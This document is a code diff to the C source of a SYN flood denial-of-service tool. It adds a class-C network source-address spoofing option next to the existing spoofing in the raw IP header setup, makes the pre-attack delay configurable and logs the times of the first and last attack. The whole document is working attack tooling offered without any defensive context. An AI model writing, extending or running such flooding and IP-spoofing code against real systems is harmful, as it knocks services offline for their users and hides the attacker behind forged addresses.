@@ -6,13 +6,16 @@
 bool attack = true;
 struct in_addr current_ipv4_addr;
 
-extern bool enable_sniffer;  /* Defined in cli.c */
-extern bool enable_spoofing;  /* Defined in cli.c */
-extern bool enable_attack_time;  /* Defined in cli.c */
-extern bool enable_wait_time;  /* Defined in cli.c */
-extern bool enable_loop_count;  /* Defined in cli.c */
+/* the following extern declared variables are defined in src/cli.c */ 
+extern bool enable_sniffer;  
+extern bool enable_spoofing;  
+extern bool enable_attack_time;  
+extern bool enable_wait_time;  
+extern bool enable_loop_count;  
+extern bool enable_classc ; 	
 
 int loops_done = 0 ; 
+
 
 void
 sigalrm_handler (int signo)
@@ -62,7 +65,12 @@ setIpHeaders (struct iphdr *ip_headers, struct in_addr *hin_addr)
   ip_headers->protocol = 0x06;
   ip_headers->check = 0x0000;     /* Will be set by the kernel. See raw(7). */
   /* Can't wait for the kernel because need to compute the checksum ourselves. */
-  ip_headers->saddr = enable_spoofing ? getSpoofedIpAddr() : current_ipv4_addr.s_addr;
+  /* ip_headers->saddr = enable_spoofing ? getSpoofedIpAddr() : current_ipv4_addr.s_addr; */ 
+  ip_headers->saddr = current_ipv4_addr.s_addr ; 
+  if ( enable_spoofing ) 
+    ip_headers->saddr = net_getSpoofedIpAddr() ; 
+  if ( enable_classc ) 
+    ip_headers->saddr = host_getSpoofedIpAddr() ; 
   ip_headers->daddr = hin_addr->s_addr;
 }
 
@@ -182,12 +190,6 @@ synflood_c (char *hostname, unsigned int port, struct sockaddr_in host_addr, uns
     loops_done++ ; 
   }
 
-  struct timeval time;
-  gettimeofday(&time, NULL);
-  int64_t s1 = (int64_t)(time.tv_sec) % 60 ;
-  int64_t s2 = (time.tv_usec );
-
-  vlog ( "last attack in second %3d.%06d \n" , (int)s1 , (int)s2 ) ; 
   /* sleep ( 5 ) ; */ 
 }
 
@@ -222,23 +224,28 @@ main (int argc, char *argv[], char *envp[])
   char current_ipv4_addr_buf[32];
   strcpy(current_ipv4_addr_buf, inet_ntoa(current_ipv4_addr));
   vlog("Initialized synflood with:\n\
-  target hostname:        %s\n\
-  target address:         %s\n\
-  target port:            %d\n\
-  enabled attack time:    %d\n\
-  attack time:            %u %s\n\
-  sniffer:                %s\n\
-  spoofing:               %s\n\
-  enabled wait time:      %u\n\
-  wait time:              %u\n\
-  enabled loop count:     %u\n\
-  loop count:             %u\n\
-  own address:            %s\n",
+  target hostname:           %s\n\
+  target address:            %s\n\
+  target port:               %d\n\
+  enabled attack time:       %s\n\
+  attack time:               %u %s\n\
+  sniffer:                   %s\n\
+  class-c network spoofing:  %s\n\
+  enable spoofing:           %s\n\
+  enabled wait time:         %s\n\
+  wait time:                 %u\n\
+  enabled loop count:        %s\n\
+  loop count:                %u\n\
+  own address:               %s\n",
        hostname, inet_ntoa(host_addr.sin_addr), port, 
-       enable_attack_time , attack_time,
-       attack_time == 1 ? "second" : "seconds", enable_sniffer ? "enabled" : "disabled",
+       enable_attack_time ? "enabled" : "disabled" , attack_time,
+       attack_time == 1 ? "second" : "seconds", 
+       enable_sniffer ? "enabled" : "disabled",
+       enable_classc ? "enabled" : "disabled", 
        enable_spoofing ? "enabled" : "disabled", 
-       enable_wait_time , wait_time , enable_loop_count , loop_count , current_ipv4_addr_buf);
+       enable_wait_time ? "enabled" : "disabled" , wait_time , 
+       enable_loop_count ? "enabled" : "disabled" , loop_count , 
+       current_ipv4_addr_buf);
 
   if (enable_sniffer) {
     pid = fork();
@@ -251,8 +258,16 @@ main (int argc, char *argv[], char *envp[])
       return EXIT_FAILURE ; 
   } 
 
-  vlog("Commencing attack in %d %s.\n", SUSPENSE_TIME, SUSPENSE_TIME == 1 ? "second" : "seconds");
-  sleep(SUSPENSE_TIME);
+  vlog("Commencing attack in %d %s.\n", wait_time, wait_time == 1 ? "second" : "seconds");
+  sleep(wait_time);
+
+  struct timeval time;
+  int64_t s1 , s2 ; 
+  gettimeofday(&time, NULL);
+  s1 = (int64_t)(time.tv_sec) % 60 ;
+  s2 = (time.tv_usec );
+
+  vlog ( "time of first attack - showing second only  %3d.%06d \n" , (int)s1 , (int)s2 ) ; 
 
   /* vlog("waiting time : %d %s \n", wait_time, wait_time == 1 ? "second" : "seconds");
   vlog("loop count : %d \n" , loop_count ) ; */ 
@@ -266,8 +281,14 @@ main (int argc, char *argv[], char *envp[])
       synflood_c (hostname, port, host_addr, loop_count );
   } ; 
 
+  gettimeofday(&time, NULL);
+  s1 = (int64_t)(time.tv_sec) % 60 ;
+  s2 = (time.tv_usec );
+
+  vlog ( "time of last attack - showing second only  %3d.%06d \n" , (int)s1 , (int)s2 ) ; 
+
   sleep(wait_time);
-  vlog("number of packets sent out: %d \n" , loops_done ) ; 
+  vlog("number of packets sent out: more than %d \n" , loops_done ) ; 
   vlog("job finished \n" ) ; 
   
   /* It seems like pcap spawns some kind of weird daemon or regular child process that we can't
